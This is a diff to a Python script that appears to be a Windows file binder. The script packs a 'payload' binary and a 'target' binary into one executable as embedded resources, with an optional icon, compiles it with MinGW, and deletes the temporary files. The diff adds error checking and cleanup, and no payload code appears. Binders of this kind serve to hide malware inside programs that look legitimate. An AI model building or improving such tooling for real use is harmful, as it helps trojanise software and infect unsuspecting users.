@@ -22,6 +22,7 @@ class Main:
         self.PAYLOAD_BINARY_RES_PATH ="payload.txt"
         self.FLAGS = "-lshlwapi"
         self.OUTPUT_DIR = "output"
+        self.MIN_LEN_OF_OUTPUT_MESSAGE = 12
 
         self.res_content = []
 
@@ -66,12 +67,16 @@ class Main:
                 print("[!] Exiting....")
                 return
         
+        #let's compile everything
         self.make()
 
+        #delete temp files
+        self.cleanup()
 
     def copy_binary(self, filepath):
         """
         filepath : path to file to copy
+        This method makes a copy of the given file in argument. This basically just renames a file, but we dont' want to make changes to anything.
         """
 
         basename = filepath.split('.')[0]
@@ -86,15 +91,18 @@ class Main:
         shutil.copyfile(filepath, output)
 
     def rsc_content_init(self):
-        self.res_content.append("#include <winnt.h>\n")
-        self.res_content.append("#include resource.h\n")
-        self.res_content.append('IDR_PAYLOAD\tRCDATA\t"'+self.PAYLOAD_BINARY_RES_PATH+'"\n')
-        self.res_content.append('IDR_TARGET\tRCDATA\t"'+self.TARGET_BINARY_RES_PATH+'"\n')
+        """Generation of the resources file"""
+        
+        self.res_content.append("#include <winnt.h>\t\n")
+        self.res_content.append('#include "src/includes/resource.h"\t\n')
+        self.res_content.append('IDR_PAYLOAD\tRCDATA\t"'+self.PAYLOAD_BINARY_RES_PATH+'"\t\n')
+        self.res_content.append('IDR_TARGET\tRCDATA\t"'+self.TARGET_BINARY_RES_PATH+'"\t\n')
 
         if self.noicon == False:
-            self.res_content.append('MAIN_ICON\tICON\t"\n' + self.ICON_PATH + '"')
+            self.res_content.append('MAIN_ICON\tICON\t"' + self.ICON_PATH + '"\t\n')
                 
     def make_rsc_file(self):
+        """Writes the content of self.res_content to disk"""
 
         self.rsc_content_init()
 
@@ -102,24 +110,48 @@ class Main:
             f.writelines(self.res_content)
             
     def make(self):
+        """This method takes care of compiling the resources file and the two binded binaries."""
+        
+        out = ""
 
+        #dumping res.rc to disk [will be compiled as resource file]
         self.make_rsc_file()
-        #main.c -o main.exe res.o -lshlwapi
-        #x86_64-w64-mingw32-windres res.rc res.o
- #       commands.getstatusoutput("x86_64-w64-mingw32-windres {resfile} {resobj}".format(resfile=self.RESOURCE_FILE_PATH, resobj=self.RESOURCE_OBJ_PATH)  
-  #      commands.getstatusoutput("x86_64-w64-mingw32-gcc {src} -o {output} {objres} {flag}".format(src=self.BINDER_SRC_PATH, output=self.output, objres=self.RESOURCE_OBJ_PATH, flag=self.FLAGS)
-        #args = ['gdb', '-q', filename]
-        #p = subprocess.Popen(args,  stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-
-        print("x86_64-w64-mingw32-windres {resfile} {resobj}".format(resfile=self.RESOURCE_FILE_PATH, resobj=self.RESOURCE_OBJ_PATH))  
-        print("x86_64-w64-mingw32-gcc {src} -o {output} {objres} {flag}".format(src=self.BINDER_SRC_PATH, output=self.output, objres=self.RESOURCE_OBJ_PATH, flag=self.FLAGS))
-
+        
         res_command = "x86_64-w64-mingw32-windres {resfile} {resobj}".format(resfile=self.RESOURCE_FILE_PATH, resobj=self.RESOURCE_OBJ_PATH)
         build_command = "x86_64-w64-mingw32-gcc {src} -o {output} {objres} {flag}".format(src=self.BINDER_SRC_PATH, output=self.output, objres=self.RESOURCE_OBJ_PATH, flag=self.FLAGS)
 
-        subprocess.Popen(res_command.split(), stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-        subprocess.Popen(build_command.split(), stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        if not self.quiet:
+            print("[*] Compiling :")
+            print(res_command)  
+            print(build_command)
 
+        res_process = subprocess.Popen(res_command.split(), stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        out += "".join(map(str,res_process.communicate()))
+        build_process = subprocess.Popen(build_command.split(), stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        out += "".join(map(str,build_process.communicate()))
+
+        #checking the len of out to know it we encoutered errors
+        if len(out) > self.MIN_LEN_OF_OUTPUT_MESSAGE:
+            print("[!] Errors : " + out)
+        else:
+            print("[*] Compilation succeeded")
+
+
+    def cleanup(self):
+        """Removes every temporary files created during the compilation"""
+
+        files = [self.TARGET_BINARY_RES_PATH, 
+                self.PAYLOAD_BINARY_RES_PATH,
+                self.RESOURCE_FILE_PATH,
+                self.RESOURCE_OBJ_PATH,
+                self.ICON_PATH]
+
+        for item in files:
+            if os.path.exists(item):
+                os.remove(item)
+                print("[*] " + item + " deleted")
+            else:
+                print("[!] File " + item + " not found while cleanin up. This could be an error.")
 
 if __name__ == "__main__":
     main = Main()
